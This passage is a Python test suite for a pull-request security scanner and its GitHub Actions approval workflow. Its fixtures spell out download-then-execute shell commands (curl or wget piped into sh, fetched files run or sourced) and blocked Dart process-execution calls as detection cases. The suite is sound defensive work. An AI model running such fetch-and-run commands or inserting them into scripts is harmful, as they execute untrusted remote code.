        script = blocked(f"#!/bin/sh\ncurl -o/tmp/i {self.URL} && ", "sh", " /tmp/i\n")
        self.assertBlocked(self.build({}, {"packaging/bc.sh": script}))

    def test_long_output_forms(self):
        for name, script in (
            ("packaging/bd.sh", blocked(f"#!/bin/sh\nwget --output-document=/tmp/i {self.URL} && ", "sh", " /tmp/i\n")),
            ("packaging/be.sh", blocked(f"#!/bin/sh\ncurl --output /tmp/i {self.URL} && ", "bash", " /tmp/i\n")),
        ):
            with self.subTest(name):
                self.assertBlocked(self.build({}, {name: script}))

    def test_download_without_execution_is_not_blocked(self):
        script = f"#!/bin/sh\nwget -q {self.URL}/archive.tar.gz\ntar xf archive.tar.gz\n"
        self.assertOrdinary(self.build({}, {"packaging/bf.sh": script}))

    def test_backslash_continuation_at_every_position(self):
        """A command may break at any point where a space is legal."""
        cases = {
            "before the flag": f"curl -fsSL {self.URL} \\\n  -o /tmp/i && ",
            "between flag and target": f"curl -fsSL {self.URL} -o \\\n  /tmp/i && ",
            "before the interpreter": f"curl -fsSL {self.URL} -o /tmp/i && \\\n  ",
        }
        for name, prefix in cases.items():
            with self.subTest(name):
                script = blocked("#!/bin/sh\n" + prefix, "sh", " /tmp/i\n")
                self.assertBlocked(self.build({}, {"packaging/k.sh": script}))

    def test_continuation_between_interpreter_and_its_argument(self):
        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/i && ", "sh", " \\\n  /tmp/i\n")
        self.assertBlocked(self.build({}, {"packaging/l.sh": script}))

    def test_pipeline_stage_before_the_interpreter(self):
        """`| tee f | sh` pipes the same downloaded stream into the shell."""
        script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} | tee /tmp/log | ", "sh", "\n")
        self.assertBlocked(self.build({}, {"packaging/t.sh": script}))

    def test_sourcing_the_downloaded_file(self):
        """`. f` and `source f` run it in the current shell."""
        for name, spelling in (("packaging/s1.sh", "."), ("packaging/s2.sh", "source")):
            with self.subTest(spelling):
                script = blocked(
                    f"#!/bin/sh\ncurl -fsSL {self.URL} -o /tmp/i && ", spelling, " /tmp/i\n"
                )
                self.assertBlocked(self.build({}, {name: script}))

    def test_wrapper_command_before_the_interpreter(self):
        """`env sh` launches the interpreter just as `sh` does."""
        for name, wrapper in (
            ("packaging/w1.sh", "env"),
            ("packaging/w2.sh", "nohup"),
            ("packaging/w3.sh", "env FOO=1"),
        ):
            with self.subTest(wrapper):
                script = blocked(f"#!/bin/sh\ncurl -fsSL {self.URL} | {wrapper} ", "sh", "\n")
                self.assertBlocked(self.build({}, {name: script}))

    def test_wrapper_before_a_non_interpreter_is_not_blocked(self):
        script = f"#!/bin/sh\ncurl -s {self.URL} | timeout 5 jq .\n"
        self.assertOrdinary(self.build({}, {"packaging/w4.sh": script}))

    def test_redirect_belonging_to_a_later_command_is_not_blocked(self):
        """The curl never writes /tmp/i; printf does, after a `;`."""
        script = (
            "#!/bin/sh\n"
            f"curl {self.URL}; printf 'echo ok' > /tmp/i; sh /tmp/i\n"
        )
        self.assertOrdinary(self.build({}, {"packaging/r.sh": script}))

    def test_logical_or_is_not_a_pipeline(self):
        script = f"#!/bin/sh\ncurl -fsSL {self.URL}/probe || sh ./fallback.sh\n"
        self.assertOrdinary(self.build({}, {"packaging/o.sh": script}))

    def test_dot_as_an_argument_is_not_sourcing(self):
        """`jq . file` passes a dot; it does not source anything."""
        script = (
            "#!/bin/sh\n"
            f"curl -s {self.URL} -o /tmp/d.json && jq . /tmp/d.json\n"
        )
        self.assertOrdinary(self.build({}, {"packaging/j.sh": script}))

    def test_executed_file_only_sharing_a_prefix_is_not_blocked(self):
        """`/tmp/data` and `/tmp/data-cleanup.sh` are different files."""
        script = (
            "#!/bin/sh\n"
            f"curl -fsSL {self.URL} -o /tmp/data && sh /tmp/data-cleanup.sh\n"
        )
        self.assertOrdinary(self.build({}, {"packaging/pre.sh": script}))

    def test_downloading_data_and_running_an_unrelated_script_is_not_blocked(self):
        """The backreference is what keeps this rule from over-matching."""
        script = (
            "#!/bin/sh\n"
            f"curl -fsSL {self.URL}/catalog.json -o /tmp/catalog.json\n"
            "bash ./scripts/process_catalog.sh /tmp/catalog.json\n"
        )
        self.assertOrdinary(self.build({}, {"packaging/f.sh": script}))


class AddedLineMapping(unittest.TestCase):
    """A match counts only when it overlaps a line the PR added."""

    def test_match_inside_an_added_line(self):
        offsets = scanner._line_index("a\nb\nc\n")
        self.assertTrue(scanner.touches_added_lines(offsets, frozenset({2}), 2, 3))

    def test_match_entirely_inside_untouched_lines(self):
        offsets = scanner._line_index("a\nb\nc\n")
        self.assertFalse(scanner.touches_added_lines(offsets, frozenset({2}), 0, 1))

    def test_match_spanning_context_into_an_added_line(self):
        """The finding-E shape: receiver on an old line, member on a new one."""
        text = "final e = Process\n  .run;\n"
        offsets = scanner._line_index(text)
        rule = scanner.BLOCKED_ADDITION_RULES[0][0]
        match = rule.search(text)
        self.assertIsNotNone(match)
        self.assertTrue(
            scanner.touches_added_lines(offsets, frozenset({2}), match.start(), match.end())
        )
        self.assertFalse(
            scanner.touches_added_lines(offsets, frozenset({9}), match.start(), match.end())
        )


class ConstructCompletedFromContext(ScannerTestCase):
    """A PR can finish a blocked construct using tokens already in the file."""

    def test_added_fragment_completes_an_existing_receiver(self):
        base = "class R {\n  static final execute = " + PROCESS_RUN[:7] + "\n  ;\n}\n"
        head = "class R {\n  static final execute = " + PROCESS_RUN[:7] + "\n  ." + PROCESS_RUN[8:] + ";\n}\n"
        result = self.build({"lib/r.dart": base}, {"lib/r.dart": head})
        self.assertBlocked(result)
        self.assertIn("lib/r.dart", result.reported_paths())

    def test_grandfathered_construct_is_reviewed_but_never_blocked(self):
        """Editing elsewhere in a file that already contains a blocked call.

        The construct was not introduced here, so it must not hard-block the
        PR — an approval has to remain possible. It is still surfaced, because
        an edit elsewhere in the file can be what made it reachable.
        """
        base = f"void t() {{\n  {PROCESS_RUN}('x');\n}}\n// tail\n"
        head = f"void t() {{\n  {PROCESS_RUN}('x');\n}}\n// tail edited\n"
        self.assertSensitive(self.build({"lib/t.dart": base}, {"lib/t.dart": head}))

    def test_touching_the_grandfathered_line_itself_is_reported(self):
        base = f"void t() {{\n  {PROCESS_RUN}('x');\n}}\n"
        head = f"void t() {{\n  {PROCESS_RUN}('y');\n}}\n"
        self.assertBlocked(self.build({"lib/t.dart": base}, {"lib/t.dart": head}))


class FailClosed(ScannerTestCase):
    def test_unknown_base_revision_fails_closed(self):
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp, True)
        repo = tmp / "repo"
        repo.mkdir()
        _git(repo, "init", "-q", "-b", "main", ".")
        _git(repo, "config", "user.email", "test@example.invalid")
        _git(repo, "config", "user.name", "Test")
        _write(repo, "README.md", "# fixture\n")
        head_sha = _commit(repo, "base")

        result = self.scan(repo, "0" * 40, head_sha)
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
        self.assertIn("could not inspect the diff", result.stderr)

    def test_outside_a_git_repository_fails_closed(self):
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp, True)
        result = self.scan(tmp, "HEAD~1", "HEAD")
        self.assertEqual(result.returncode, 2, result.stdout + result.stderr)

    def test_unresolvable_diff_path_is_reported_as_sensitive(self):
        sensitive, blocked = scanner.classify([], [], unresolved_paths=True)
        self.assertTrue(sensitive)
        self.assertFalse(blocked)


class GitPathUnquoting(unittest.TestCase):
    def test_plain_paths_pass_through(self):
        self.assertEqual(scanner.unquote_git_path("b/lib/main.dart"), "b/lib/main.dart")

    def test_octal_escapes_decode_to_utf8(self):
        self.assertEqual(
            scanner.unquote_git_path('"b/lib/features/\\303\\251vil.dart"'),
            "b/lib/features/évil.dart",
        )

    def test_control_and_quote_escapes(self):
        self.assertEqual(scanner.unquote_git_path('"b/we\\"ird\\ttab.dart"'), 'b/we"ird\ttab.dart')

    def test_backslash_escape(self):
        self.assertEqual(scanner.unquote_git_path('"b/a\\\\b"'), "b/a\\b")


def _workflow() -> dict:
    try:
        import yaml
    except ImportError:  # pragma: no cover - exercised only on hosts without PyYAML
        raise unittest.SkipTest("PyYAML is not installed")
    return yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))


def _job() -> dict:
    return _workflow()["jobs"]["security-surface"]


def _step(name: str) -> dict:
    for step in _job()["steps"]:
        if step.get("name") == name:
            return step
    raise AssertionError(f"workflow step {name!r} not found")


class WorkflowInvariants(unittest.TestCase):
    def test_permissions_are_read_only(self):
        workflow = _workflow()
        self.assertEqual(workflow["permissions"], {"contents": "read", "pull-requests": "read"})
        self.assertNotIn("permissions", _job())

    def test_workflow_is_not_triggered_by_pull_request_target(self):
        # PyYAML parses a bare `on:` key as the boolean True.
        triggers = _workflow()[True]
        self.assertEqual(set(triggers), {"pull_request", "pull_request_review"})

    def test_no_repository_secrets_are_referenced(self):
        self.assertNotIn("secrets.", WORKFLOW.read_text(encoding="utf-8"))

    def test_pr_controlled_values_are_passed_through_env_not_interpolated_into_shell(self):
        for step in _job()["steps"]:
            script = step.get("run", "")
            self.assertNotIn("github.event.pull_request", script, step.get("name"))
            self.assertNotIn("github.event.review", script, step.get("name"))

    def test_review_lookup_is_paginated(self):
        script = _step("Require owner approval for sensitive external PR")["run"]
        self.assertIn("gh api --paginate", script)

    def test_checkout_does_not_persist_credentials(self):
        self.assertIs(_step("Checkout PR head")["with"]["persist-credentials"], False)


class ReviewDecisionFilter(unittest.TestCase):
    """Exercise the jq filter the workflow uses, straight out of the workflow."""

    OWNER = "TheZupZup"
    HEAD = "a" * 40
    OLD = "b" * 40

    @classmethod
    def setUpClass(cls):
        if shutil.which("jq") is None:  # pragma: no cover - exercised only without jq
            raise unittest.SkipTest("jq is not installed")
        cls.filter = _job()["env"]["REVIEW_DECISION_JQ"]

    def decide(self, reviews: list[dict], head: str | None = None) -> str:
        result = subprocess.run(
            [
                "jq",
                "-r",
                "--arg",
                "owner",
                self.OWNER,
                "--arg",
                "head",
                head or self.HEAD,
                self.filter,
            ],
            input=json.dumps(reviews),
            text=True,
            check=True,
            stdout=subprocess.PIPE,
        )
        return result.stdout.strip()

    @staticmethod
    def review(state: str, *, user: str = "TheZupZup", commit: str = "a" * 40, at: str = "2026-01-01T00:00:00Z", rid: int = 1) -> dict:
        return {"id": rid, "user": {"login": user}, "commit_id": commit, "state": state, "submitted_at": at}

    def test_external_pr_without_approval(self):
        self.assertEqual(self.decide([]), "")

    def test_approval_on_current_head(self):
        self.assertEqual(self.decide([self.review("APPROVED")]), "APPROVED")

    def test_approval_on_an_old_head_does_not_count(self):
        self.assertEqual(self.decide([self.review("APPROVED", commit=self.OLD)]), "")

    def test_a_new_push_invalidates_the_previous_approval(self):
        approved_old = [self.review("APPROVED", commit=self.OLD, rid=1)]
        self.assertEqual(self.decide(approved_old, head=self.OLD), "APPROVED")
        self.assertEqual(self.decide(approved_old, head=self.HEAD), "")

    def test_comment_only_review_does_not_revoke_approval(self):
        reviews = [
            self.review("APPROVED", at="2026-01-01T00:00:00Z", rid=1),
            self.review("COMMENTED", at="2026-01-02T00:00:00Z", rid=2),
        ]
        self.assertEqual(self.decide(reviews), "APPROVED")

    def test_changes_requested_after_approval_wins(self):
        reviews = [
            self.review("APPROVED", at="2026-01-01T00:00:00Z", rid=1),
            self.review("CHANGES_REQUESTED", at="2026-01-02T00:00:00Z", rid=2),
        ]
        self.assertEqual(self.decide(reviews), "CHANGES_REQUESTED")

    def test_dismissal_after_approval_requires_re_approval(self):
        reviews = [
            self.review("APPROVED", at="2026-01-01T00:00:00Z", rid=1),
            self.review("DISMISSED", at="2026-01-02T00:00:00Z", rid=2),
        ]
        self.assertEqual(self.decide(reviews), "DISMISSED")

        reviews.append(self.review("APPROVED", at="2026-01-03T00:00:00Z", rid=3))
        self.assertEqual(self.decide(reviews), "APPROVED")

    def test_non_owner_approval_does_not_count(self):
        self.assertEqual(self.decide([self.review("APPROVED", user="contributor")]), "")

    def test_identical_timestamps_fall_back_to_review_id(self):
        same = "2026-01-01T00:00:00Z"
        reviews = [
            self.review("APPROVED", at=same, rid=10),
            self.review("CHANGES_REQUESTED", at=same, rid=11),
        ]
        self.assertEqual(self.decide(reviews), "CHANGES_REQUESTED")

    def test_a_later_page_of_reviews_outranks_an_earlier_approval(self):
        """What --paginate exists for: page 2 must be able to revoke page 1."""
        page_one = [self.review("APPROVED", at="2026-01-01T00:00:00Z", rid=1)]
        page_two = [self.review("CHANGES_REQUESTED", at="2026-02-01T00:00:00Z", rid=101)]
        self.assertEqual(self.decide(page_one), "APPROVED")
        self.assertEqual(self.decide(page_one + page_two), "CHANGES_REQUESTED")

    def test_missing_user_object_is_tolerated(self):
        ghost = {"id": 1, "user": None, "commit_id": self.HEAD, "state": "APPROVED", "submitted_at": "2026-01-01T00:00:00Z"}
        self.assertEqual(self.decide([ghost]), "")


class TrustedScannerLoader(unittest.TestCase):
    """Run the workflow's 'Load trusted scanner' script against real git repos."""

    OWNER = "TheZupZup"
    REPO = "TheZupZup/Linthra"
    SCANNER_PATH = "scripts/check_pr_security_surface.py"

    def setUp(self):
        self.script = _step("Load trusted scanner")["run"]

    def _repo(self, base_has_scanner: bool, head_has_scanner: bool = True) -> tuple[Path, str]:
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp, True)
        repo = tmp / "repo"
        repo.mkdir()
        _git(repo, "init", "-q", "-b", "main", ".")
        _git(repo, "config", "user.email", "test@example.invalid")
        _git(repo, "config", "user.name", "Test")
        _write(repo, "README.md", "# fixture\n")
        if base_has_scanner:
            _write(repo, self.SCANNER_PATH, "# trusted base scanner\n")
        base_sha = _commit(repo, "base")
        if head_has_scanner:
            _write(repo, self.SCANNER_PATH, "# contributor head scanner\n")
            _commit(repo, "head")
        return repo, base_sha

    def run_loader(self, repo: Path, base_sha: str, *, author: str, head_repo: str | None = None) -> tuple[int, str, str]:
        runner_temp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, runner_temp, True)
        result = subprocess.run(
            ["bash", "-c", self.script],
            cwd=repo,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            env={
                **os.environ,
                "GIT_CONFIG_GLOBAL": os.devnull,
                "GIT_CONFIG_SYSTEM": os.devnull,
                "RUNNER_TEMP": str(runner_temp),
                "BASE_SHA": base_sha,
                "PR_AUTHOR": author,
                "REPO_OWNER": self.OWNER,
                "HEAD_REPO": head_repo if head_repo is not None else self.REPO,
                "GITHUB_REPOSITORY": self.REPO,
                "SCANNER_PATH": self.SCANNER_PATH,
            },
        )
        loaded = runner_temp / "check_pr_security_surface.py"
        return result.returncode, result.stdout, loaded.read_text(encoding="utf-8") if loaded.exists() else ""

    def test_external_pr_uses_the_trusted_base_scanner(self):
        repo, base_sha = self._repo(base_has_scanner=True)
        code, log, loaded = self.run_loader(repo, base_sha, author="contributor")
        self.assertEqual(code, 0, log)
        self.assertEqual(loaded, "# trusted base scanner\n")

    def test_owner_pr_also_uses_the_trusted_base_scanner_when_it_exists(self):
        repo, base_sha = self._repo(base_has_scanner=True)
        code, log, loaded = self.run_loader(repo, base_sha, author=self.OWNER)
        self.assertEqual(code, 0, log)
        self.assertEqual(loaded, "# trusted base scanner\n")

    def test_external_pr_fails_closed_when_the_base_scanner_is_missing(self):
        repo, base_sha = self._repo(base_has_scanner=False)
        code, log, loaded = self.run_loader(repo, base_sha, author="contributor")
        self.assertEqual(code, 1, log)
        self.assertIn("Refusing to execute the contributor-supplied scanner", log)
        self.assertEqual(loaded, "")

    def test_owner_bootstrap_may_use_the_head_scanner(self):
        repo, base_sha = self._repo(base_has_scanner=False)
        code, log, loaded = self.run_loader(repo, base_sha, author=self.OWNER)
        self.assertEqual(code, 0, log)
        self.assertIn("Bootstrap", log)
        self.assertEqual(loaded, "# contributor head scanner\n")

    def test_bootstrap_is_refused_for_an_owner_pr_from_a_fork(self):
        repo, base_sha = self._repo(base_has_scanner=False)
        code, log, loaded = self.run_loader(repo, base_sha, author=self.OWNER, head_repo="someone-else/Linthra")
        self.assertEqual(code, 1, log)
        self.assertEqual(loaded, "")

    def test_missing_base_commit_fails_closed(self):
        repo, _ = self._repo(base_has_scanner=True)
        code, log, loaded = self.run_loader(repo, "0" * 40, author=self.OWNER)
        self.assertEqual(code, 1, log)
        self.assertIn("unavailable", log)
        self.assertEqual(loaded, "")


class ActivationOfExistingCode(ScannerTestCase):
    """A change elsewhere can make untouched code live without retyping it."""

    INERT = "class A {\n/*\n  void g() { %s('sh', const []); }\n*/\n}\n"
    LIVE = "class A {\n  void g() { %s('sh', const []); }\n}\n"

    def test_uncommenting_an_existing_call_requires_review(self):
        result = self.build(
            {"lib/ui/a.dart": self.INERT % PROCESS_RUN},
            {"lib/ui/a.dart": self.LIVE % PROCESS_RUN},
        )
        self.assertSensitive(result)
        self.assertIn(
            "change to a file containing existing runtime process execution",
            result.report,
        )

    def test_deletion_in_a_file_without_blocked_code_is_ordinary(self):
        self.assertOrdinary(
            self.build({"lib/p.dart": "a\nb\nc\nd\n"}, {"lib/p.dart": "a\nd\n"})
        )

    def test_flipping_a_guard_condition_requires_review(self):
        """`if (false)` to `if (true)` loses no lines at all."""
        shape = "class A {\n  void g() {\n    if (%s) {\n      %s('sh');\n    }\n  }\n}\n"
        result = self.build(
            {"lib/ui/a.dart": shape % ("false", PROCESS_RUN)},
            {"lib/ui/a.dart": shape % ("true", PROCESS_RUN)},
        )
        self.assertSensitive(result)

    def test_editing_a_file_near_grandfathered_code_requires_review(self):
        base = f"void t() {{\n  {PROCESS_RUN}('x');\n}}\n// tail\n"
        head = f"void t() {{\n  {PROCESS_RUN}('x');\n}}\n// tail edited\n"
        self.assertSensitive(self.build({"lib/t.dart": base}, {"lib/t.dart": head}))


class SensitiveActivation(ScannerTestCase):
    """Uncommenting existing sensitive code is caught; editing beside it is not."""

    def test_uncommenting_sensitive_code_requires_review(self):
        base = "class P {\n/*\n  final c = HttpClient();\n*/\n}\n"
        head = "class P {\n  final c = HttpClient();\n}\n"
        result = self.build({"lib/ui/panel.dart": base}, {"lib/ui/panel.dart": head})
        self.assertSensitive(result)
        self.assertIn("removed suppression may activate existing", result.report)

    def test_delimiters_replaced_by_blank_lines(self):
        """Loses no lines, so a net-count signal would miss it."""
        base = "class P {\n/*\n  final c = HttpClient();\n*/\n}\n"
        head = "class P {\n\n  final c = HttpClient();\n\n}\n"
        self.assertSensitive(
            self.build({"lib/ui/panel.dart": base}, {"lib/ui/panel.dart": head})
        )

    def test_removing_an_if_false_guard(self):
        base = "class P {\n  void g() {\n    if (false) {\n      final c = HttpClient();\n    }\n  }\n}\n"
        head = "class P {\n  void g() {\n      final c = HttpClient();\n  }\n}\n"
        self.assertSensitive(
            self.build({"lib/ui/panel.dart": base}, {"lib/ui/panel.dart": head})
        )

    def test_editing_beside_sensitive_code_stays_ordinary(self):
        """The load-bearing case: 356 files hold a sensitive match.

        If an edit near any of them demanded review, the ordinary UI/tests/docs
        PR would always be a reviewed PR — the one thing the guard must not do.
        """
        base = "class W {\n  final c = HttpClient();\n}\n// tail\n"
        head = "class W {\n  final c = HttpClient();\n}\n// tail edited\n"
        self.assertOrdinary(self.build({"lib/ui/w.dart": base}, {"lib/ui/w.dart": head}))

    def test_deleting_ordinary_lines_beside_sensitive_code_stays_ordinary(self):
        """Removing plain code is not removing a suppression."""
        base = "class W {\n  final c = HttpClient();\n}\n// a\n// b\n"
        head = "class W {\n  final c = HttpClient();\n}\n"
        self.assertOrdinary(self.build({"lib/ui/w.dart": base}, {"lib/ui/w.dart": head}))


class DeletedFiles(ScannerTestCase):
    """`+++ /dev/null` is an ordinary deletion, not an unparseable header."""

    def test_deleting_an_ordinary_file_is_ordinary(self):
        self.assertOrdinary(
            self.build({"lib/ui.dart": "class U {}\n"}, {"lib/ui.dart": None})
        )

    def test_deleting_a_sensitive_file_is_still_sensitive(self):
        self.assertSensitive(
            self.build({"scripts/x.sh": "echo hi\n"}, {"scripts/x.sh": None})
        )

    def test_deleted_file_does_not_report_an_unresolved_path(self):
        result = self.build({"lib/ui.dart": "class U {}\n"}, {"lib/ui.dart": None})
        self.assertNotIn(scanner.UNKNOWN_PATH, result.report)


class UndecodablePathnames(ScannerTestCase):
    """A pathname byte that is not valid UTF-8 must not drop a file."""

    def test_invalid_utf8_pathname_is_still_scanned(self):
        result = self.build_raw(
            {},
            {b"lib/evil\xff.dart": f"void main() {{ {PROCESS_RUN}(1); }}\n".encode()},
        )
        self.assertBlocked(result)

    def test_pathname_bytes_round_trip_through_unquoting(self):
        decoded = scanner.unquote_git_path(r'"lib/evil\377.dart"')
        self.assertEqual(decoded.encode("utf-8", "surrogateescape"), b"lib/evil\xff.dart")


class GuardSelfSafety(unittest.TestCase):
    """The guard must not hard-block a PR that edits the guard.

    Blocked rules match added lines in any file, so the guard's own sources —
    which necessarily describe the patterns they reject — have to be written so
    that no rule matches them. That is what `_split_literal` in the scanner and
    `blocked()` here are for, and this test is what keeps it true: without it a
    future contributor could add one contiguous literal and make every PR
    touching the guard unmergeable.
    """

    SOURCES = (
        SCANNER,
        WORKFLOW,
        ROOT / ".github" / "workflows" / "pr-security-review-tests.yml",
        ROOT / "docs" / "audits" / "pr-security-guard.md",
        Path(__file__).resolve(),
    )

    def test_guard_sources_do_not_trip_their_own_blocked_rules(self):
        """Scanned exactly as the guard would scan them: whole file, one block."""
        for source in self.SOURCES:
            block = source.read_text(encoding="utf-8")
            for pattern, reason in scanner.BLOCKED_ADDITION_RULES:
                match = pattern.search(block)
                self.assertIsNone(
                    match,
                    f"{source.relative_to(ROOT)} trips the {reason!r} rule at "
                    f"line {block[: match.start()].count(chr(10)) + 1 if match else 0}: "
                    f"{match.group(0)!r}" if match else "",
                )

    def test_assembled_fixtures_are_the_literals_they_claim_to_be(self):
        """The split fixtures must still be the exact patterns under test."""
        self.assertEqual(PROCESS_RUN, "Process" ".run")
        self.assertEqual(RUN_IN_SHELL, "runIn" "Shell")
        self.assertEqual(DART_FFI, "dart:" "ffi")
        self.assertEqual(DYNAMIC_LIBRARY, "Dynamic" "Library")
        self.assertEqual(PR_TARGET, "pull_request" "_target")
        self.assertEqual(WRITE_ALL, "permissions: " "write-all")

    def test_every_blocked_rule_matches_its_own_reason_free_fixture(self):
        """Guards against a fragment split that quietly breaks a rule."""
        fixtures = (
            f"{PROCESS_RUN}('sh', [])",
            f"{PROCESS_START}('sh')",
            f"'{RUN_IN_SHELL}': true",
            f"import '{DART_FFI}';",
            f"{DYNAMIC_LIBRARY}.open('x')",
            f"on: [{PR_TARGET}]",
            WRITE_ALL,
            blocked("curl -s https://example.invalid ", "|", " bash"),
            blocked("curl -s https://example.invalid -o /tmp/x && ", "sh", " /tmp/x"),
            blocked(
                "curl -s https://example.invalid -o /tmp/x && chmod +x /tmp/x\n",
                "/tmp/x",
                "\n",
            ),
        )
        # Indexed, not keyed by reason: two rules share the download-then-execute
        # reason, and a set of reasons could never account for both.
        unmatched = [
            reason
            for index, (pattern, reason) in enumerate(scanner.BLOCKED_ADDITION_RULES)
            if not any(pattern.search(fixture) for fixture in fixtures)
        ]
        self.assertEqual(unmatched, [], f"rules with no fixture: {unmatched}")


class RealRepositoryScanner(unittest.TestCase):
    """The scanner Linthra actually ships must at least be runnable."""

    def test_scanner_reports_usage_without_arguments(self):
        result = subprocess.run(
            [sys.executable, str(SCANNER)],
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("--base", result.stderr)


if __name__ == "__main__":
    unittest.main(verbosity=2)
